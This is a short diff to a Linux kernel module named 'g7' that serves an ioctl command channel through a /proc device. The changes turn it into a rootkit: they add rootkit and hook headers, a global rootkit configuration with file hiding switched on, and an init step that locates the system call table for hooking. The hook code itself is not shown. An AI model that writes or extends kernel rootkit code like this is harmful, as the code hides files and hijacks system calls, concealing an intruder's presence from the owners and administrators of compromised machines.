@@ -8,9 +8,12 @@
 #include <linux/printk.h>
 
 #include "common.h"
+#include "rootkit.h"
 #include "ioctl.h"
+#include "hook.h"
 
 #define BUFLEN 4096
+
 
 static int  __init g7_init(void);
 static void __exit g7_exit(void);
@@ -35,6 +38,10 @@ static struct file_operations g7_fops =
     .release        = g7_release,
 };
 
+
+rootkit_t rootkit = {
+    .hiding_files = true,
+};
 
 
 static int
@@ -70,7 +77,7 @@ g7_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 static long
 g7_ioctl(struct file *_file, unsigned int cmd, unsigned long arg)
 {
-    channel c = detect_channel(cmd);
+    channel_t c = detect_channel(cmd);
     DEBUG_NOTICE("[g7_ioctl] on %#10x (%s)\n", cmd, c.name);
 
     if (((const char *)arg) && c.handler)
@@ -85,6 +92,9 @@ g7_init(void)
 {
     mutex_init(&lock);
     proc_create_data(G7_DEVICE, S_IRUSR | S_IWUSR, 0, &g7_fops, buf);
+
+    if (!retrieve_sys_call_table())
+        return -1;
 
     DEBUG_INFO("[g7_init] at /proc/%s\n", G7_DEVICE);
     report_channels();
